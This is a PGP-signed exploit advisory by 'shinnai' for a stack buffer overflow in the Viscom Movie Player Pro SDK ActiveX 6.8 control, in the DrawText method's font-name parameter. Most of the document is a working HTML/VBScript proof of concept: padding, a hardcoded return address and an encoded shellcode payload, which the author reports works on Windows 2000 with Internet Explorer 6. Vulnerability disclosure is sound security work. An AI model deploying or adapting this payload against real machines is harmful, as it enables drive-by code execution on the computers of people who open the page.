@@ -1,0 +1,103 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+- -----------------------------------------------------------------------------
+ Viscom Software Movie Player Pro SDK ActiveX 6.8 Remote Buffer Overflow
+ url: http://www.viscomsoft.com/
+
+ Author:	shinnai
+ mail:		shinnai[at]autistici[dot]org
+ site:		http://www.shinnai.net/
+
+ File name:	MoviePlayer.ocx
+ Version:	6.8.0.0
+ GUID:		{F4A32EAF-F30D-466D-BEC8-F4ED86CAF84E}
+ ProgID:	MOVIEPLAYER.MoviePlayerCtrl.1
+ Description:	MoviePlayer Pro ActiveX
+
+ Safety report:	RegKey Safe for Script: False
+		RegKey Safe for Init: False
+		Implements IObjectSafety: True
+		IDisp Safe: Safe for untrusted: caller, data
+		IPStorage Safe: Safe for untrusted: caller, data
+
+ Vuln. Method:	"DrawText"
+ Vuln. Param.:	"strFontName"
+
+ Description:	A stack-based buffer overflow occurs when you pass to
+		"strFontName" parameter a string overly long than 24
+		bytes which leads into EIP overwrite allowing the
+		execution of arbitrary code in the context of the logged
+		on user.
+		This happens because an inadequate space is stored
+		into the buffer intended to receive the font name.
+
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Tested on:
+ Windows XP Professional SP3 with Internet Explorer 8
+ Windows 2000 Professional SP4 with Internet Explorer 6 (working exploit)
+- - -----------------------------------------------------------------------------
+
+<html>
+ <object classid='clsid:F4A32EAF-F30D-466D-BEC8-F4ED86CAF84E' id='test'></object>
+  <script language = 'vbscript'>
+
+   buf_1 = String(32, "A")
+
+   pwEIP = unescape("%40%46%E3%77") 'call EBP from user32.dll Win 2k Pro
+
+   buf_2 = String(416, "A")
+
+   sCode = unescape("%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49") & _
+           unescape("%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36") & _
+           unescape("%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34") & _
+           unescape("%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41") & _
+           unescape("%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%34") & _
+           unescape("%42%50%42%30%42%50%4b%38%45%44%4e%43%4b%38%4e%47") & _
+           unescape("%45%30%4a%47%41%30%4f%4e%4b%48%4f%54%4a%41%4b%38") & _
+           unescape("%4f%55%42%52%41%30%4b%4e%49%54%4b%48%46%33%4b%48") & _
+           unescape("%41%50%50%4e%41%43%42%4c%49%59%4e%4a%46%48%42%4c") & _
+           unescape("%46%47%47%50%41%4c%4c%4c%4d%50%41%50%44%4c%4b%4e") & _
+           unescape("%46%4f%4b%43%46%35%46%52%46%30%45%37%45%4e%4b%58") & _
+           unescape("%4f%45%46%42%41%50%4b%4e%48%46%4b%48%4e%30%4b%44") & _
+           unescape("%4b%48%4f%35%4e%41%41%30%4b%4e%4b%38%4e%51%4b%38") & _
+           unescape("%41%50%4b%4e%49%38%4e%45%46%32%46%50%43%4c%41%33") & _
+           unescape("%42%4c%46%46%4b%48%42%34%42%33%45%38%42%4c%4a%47") & _
+           unescape("%4e%30%4b%38%42%34%4e%50%4b%58%42%47%4e%41%4d%4a") & _
+           unescape("%4b%58%4a%36%4a%30%4b%4e%49%50%4b%48%42%48%42%4b") & _
+           unescape("%42%30%42%50%42%30%4b%38%4a%56%4e%43%4f%55%41%33") & _
+           unescape("%48%4f%42%46%48%35%49%38%4a%4f%43%58%42%4c%4b%37") & _
+           unescape("%42%55%4a%36%42%4f%4c%58%46%50%4f%35%4a%36%4a%59") & _
+           unescape("%50%4f%4c%38%50%50%47%55%4f%4f%47%4e%43%56%41%56") & _
+           unescape("%4e%46%43%56%50%32%45%46%4a%37%45%36%42%50%5a")
+
+   buf_3 = String(4899, "A")
+
+   egg = buf_1 & pwEIP & buf_2 & sCode & buf_3
+ 
+   test.DrawText 1, 1, 1, "", 1, egg, True, True, True, 1, 1, 1, 1, 1, 1
+
+</script>
+</html>
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (MingW32)
+
+iQIcBAEBAgAGBQJLS4lVAAoJEGLxkZuDw5+sRBMP/igkxar2tQO6mQjDwkLSyK49
+TpJhOOLrXvq5kOIy2zVSUfqGY3Vb1RMPAWJrK0ILbfyB5cyHnlZ48aUj9g2cwmAE
+9hxGSCQoLy35vIYT9DKtpBPYiUAzXLQ4CqPloHOAUXtwP+C8DL6GZixL6BcD0oeo
+zX1dUw4BthIvizR0IIrUcIDeZN0hzDsteu1CLrII7eOM/L03z2IU5FnY7R0pkIJX
+5jZWQfcgURhPVT3/5LzG6XzCawdlX5cw0fpjeEiCaVZWhkH6krWA4SSKgWibdkx6
+pwWrhaGWuQOHOaM0XJ+gHqodljxxdC7bzoESnaAvwAsTai7ipM6dBoRhgSsdBNas
+riA8puRkiZjgyZVqCfKFZWpxxaxlDx79peFGd/WTX7RDaay4ZS1TAnYrwLxVYdh3
+2OIajXIvD3Bxmb91JoqqMGKzAQ4BUuvVgo9/ef+GlPhcsr8kpmjL48/IS4htLwJ9
+AEV6NmRcD465JfVHTfJb79aciPgBjQ8+IZMOLClP7Q+2OOaW/QuCaXseanD64oMJ
+kHsgzSpHvLTrQHovagymcDO5okldwH1fu5xj8GhPw2lMJGqKcp7Ld+YPIfnQ1VYj
+HzZsBCjUMYmjVIrCFLu1wnjqRR/KE68ng3Vz3/XW6WTzxxovgKWGKHd5G9eLWmZ+
+Yl9ja6Z57P/kTwhhxmIu
+=g3VB
+-----END PGP SIGNATURE-----
+
